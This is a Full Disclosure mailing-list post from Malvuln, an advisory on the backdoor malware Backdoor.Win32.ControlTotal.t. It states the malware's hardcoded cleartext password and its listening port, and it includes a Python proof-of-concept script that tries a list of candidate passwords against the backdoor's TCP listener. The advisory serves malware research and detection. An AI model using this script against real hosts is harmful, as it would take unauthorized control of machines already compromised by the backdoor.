---
title: Backdoor.Win32.ControlTotal.t / Insecure Credential Storage /	MVID-2025-0702
url: https://seclists.org/fulldisclosure/2025/Dec/28
source: Full Disclosure
date: 2025-12-23
fetch_date: 2025-12-24T03:23:09.738871
---

# Backdoor.Win32.ControlTotal.t / Insecure Credential Storage /	MVID-2025-0702

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](27)
[By Date](date.html#28)
[![Next](/images/right-icon-16x16.png)](29)

[![Previous](/images/left-icon-16x16.png)](27)
[By Thread](index.html#28)
[![Next](/images/right-icon-16x16.png)](29)

![](/shared/images/nst-icons.svg#search)

# Backdoor.Win32.ControlTotal.t / Insecure Credential Storage / MVID-2025-0702

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Sat, 20 Dec 2025 23:17:42 -0500

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2025
Original source:
https://malvuln.com/advisory/6c0eda1210da81b191bd970cb0f8660a.txt
Malvuln Intelligence Feed: https://intel.malvuln.com/
Contact: malvuln13 () gmail com
Media: x.com/malvuln

Threat: Backdoor.Win32.ControlTotal.t
Vulnerability: Insecure Credential Storage
Description: The malware listens on TCP port 2032 and requires
authentication. The password "jdf4df4vdf" is stored in cleartext
within the PE file. We send using a custom client to validate the
password, as the malware did not like nc64 likely due to CRLF
characters.
Family: ControlTotal
Type: PE32
Attack-pattern TTP: Unsecured Credentials (T1552)
MD5: 6c0eda1210da81b191bd970cb0f8660a
SHA256: 25b46a418b4e0749f83d9439fd1f5b9e2e5dd0703398516ac750580a26c800d5
Vuln ID: MVID-2025-0702
Disclosure: 12/20/2025

Exploit/PoC:
from socket import *
import time
#By John Page (aka hyp3rlinx)
#Backdoor.Win32.ControlTotal.t
#MD5: 6c0eda1210da81b191bd970cb0f8660a
#
MALWARE_HOST="x.x.x.x"
PORT=2032

candidates = [
    "cs4sd65F",
    "5s64jhbk",
    "54asD54s",
    "SDd54F7j",
    "5fh4dhhg",
    "df2gdfg2",
    "AS45aas7",
    "D54SDFfh",
    "jdf4df4vdf",  #Password Here
    "sdf21fsd",
    "dgv2fd",
    "annsk33",
    "20022okkd"
]

def chk_res(s, p=None):
    failed = False
    res = b''
    while True:
        chunk = s.recv(128)
        if not chunk:
            break
        res += chunk
        text = res.decode('latin-1', errors='ignore')
        if "xaContraseña Incorrecta" in text:
            failed = True
            break

    if not failed:
        return p

    return None

def backdoor_login(passwd):

    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))

    s.send(passwd.encode())
    result = chk_res(s, passwd)
    if result:
        print("[*] Password found: ", result)
    else:
        print("[!] Failed.")
        return False

    s.close()
    return True

def main():
    for x in candidates:
        print("[-] Trying: ", x)
        if backdoor_login(x):
            break
        time.sleep(0.6)

if __name__ == "__main__":
    main()

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or
otherwise. Permission is hereby granted for the redistribution of this
advisory, provided that it is not altered except by reformatting it,
and that due credit is given. Permission is explicitly given for
insertion in vulnerability databases and similar, provided that due
credit is given to the author. The author is not responsible for any
misuse of the information contained herein and accepts no
responsibility for any damage caused by the use or misuse of this
information. The author prohibits any malicious use of security
related information or exploits by the author or elsewhere. Do not
attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper
Malware handling or the downloading of ANY Malware mentioned on this
website or elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](27)
[By Date](date.html#28)
[![Next](/images/right-icon-16x16.png)](29)

[![Previous](/images/left-icon-16x16.png)](27)
[By Thread](index.html#28)
[![Next](/images/right-icon-16x16.png)](29)

### Current thread:

* **Backdoor.Win32.ControlTotal.t / Insecure Credential Storage / MVID-2025-0702** *malvuln (Dec 22)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")